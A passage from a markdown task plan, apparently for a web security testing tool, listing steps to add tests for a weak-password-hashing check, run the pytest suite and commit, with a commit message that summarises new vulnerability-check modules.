- [ ] **Step 4: Write + run BT tests** (same pattern — `tests/test_bt_checks_hash.py`)

- [ ] **Step 5: Commit**

```bash
git add websec_test/modules/hash.py tests/test_hash.py tests/test_bt_checks_hash.py
git commit -m "feat(hash): weak password hashing module + tests

3 checks: algorithm detection, unsalted hash, fast vs slow hash."
```

---

### Task 9: Final Validation

- [ ] **Step 1: Run ALL tests**

```bash
pytest tests/ -v --tb=short
```

Expected: All 12 new tests + 17 preserved engine/infra tests PASS. Zero failures.

- [ ] **Step 2: Run lint/typecheck if configured**

```bash
python -m pytest tests/ --tb=short
```

- [ ] **Step 3: Final commit**

```bash
git add -A
git commit -m "feat: complete auth-bypass test case migration

Replaced 22 old module-level test files with:
- 6 new vulnerability modules (sqli, nosql, ato, idor, priv_escalation, hash)
- 12 new test files (6 standard + 6 BT check-level)
- Multi-engine payloads for 6 SQL DBMS + 7 NoSQL engines
- Engine fingerprinting with Blackboard data flow
- Preserved 17 BT engine and infrastructure tests"
```
